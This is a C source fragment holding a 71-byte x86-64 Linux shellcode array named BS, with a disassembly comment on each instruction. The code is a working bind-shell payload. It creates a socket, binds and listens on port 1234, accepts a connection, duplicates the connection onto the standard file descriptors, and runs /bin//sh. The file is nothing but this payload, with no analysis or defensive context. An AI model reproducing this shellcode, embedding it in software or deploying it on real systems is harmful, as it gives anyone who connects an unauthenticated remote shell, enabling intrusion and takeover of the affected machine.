
#define BS_SIZE 71

char BS[] = {
  /* 0000 */ "\x6a\x29"                                 /* push 0x29                   */
  /* 0002 */ "\x58"                                     /* pop rax                     */
  /* 0003 */ "\x6a\x01"                                 /* push 0x1                    */
  /* 0005 */ "\x5e"                                     /* pop rsi                     */
  /* 0006 */ "\x6a\x02"                                 /* push 0x2                    */
  /* 0008 */ "\x5f"                                     /* pop rdi                     */
  /* 0009 */ "\x99"                                     /* cdq                         */
  /* 000A */ "\x0f\x05"                                 /* syscall                     */
  /* 000C */ "\x97"                                     /* xchg edi, eax               */
  /* 000D */ "\xbb\x02\xff\x04\xd2"                     /* mov ebx, 0xd204ff02         */
  /* 0012 */ "\xfe\xc7"                                 /* inc bh                      */
  /* 0014 */ "\x53"                                     /* push rbx                    */
  /* 0015 */ "\x54"                                     /* push rsp                    */
  /* 0016 */ "\x5e"                                     /* pop rsi                     */
  /* 0017 */ "\xb2\x10"                                 /* mov dl, 0x10                */
  /* 0019 */ "\xb0\x31"                                 /* mov al, 0x31                */
  /* 001B */ "\x0f\x05"                                 /* syscall                     */
  /* 001D */ "\x31\xf6"                                 /* xor esi, esi                */
  /* 001F */ "\xb0\x32"                                 /* mov al, 0x32                */
  /* 0021 */ "\x0f\x05"                                 /* syscall                     */
  /* 0023 */ "\xb0\x2b"                                 /* mov al, 0x2b                */
  /* 0025 */ "\x0f\x05"                                 /* syscall                     */
  /* 0027 */ "\x97"                                     /* xchg edi, eax               */
  /* 0028 */ "\x96"                                     /* xchg esi, eax               */
  /* 0029 */ "\xb0\x21"                                 /* mov al, 0x21                */
  /* 002B */ "\x0f\x05"                                 /* syscall                     */
  /* 002D */ "\x83\xee\x01"                             /* sub esi, 0x1                */
  /* 0030 */ "\x79\xf7"                                 /* jns 0x29                    */
  /* 0032 */ "\x31\xf6"                                 /* xor esi, esi                */
  /* 0034 */ "\x50"                                     /* push rax                    */
  /* 0035 */ "\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68" /* mov rcx, 0x68732f2f6e69622f */
  /* 003F */ "\x51"                                     /* push rcx                    */
  /* 0040 */ "\x54"                                     /* push rsp                    */
  /* 0041 */ "\x5f"                                     /* pop rdi                     */
  /* 0042 */ "\x99"                                     /* cdq                         */
  /* 0043 */ "\xb0\x3b"                                 /* mov al, 0x3b                */
  /* 0045 */ "\x0f\x05"                                 /* syscall                     */
};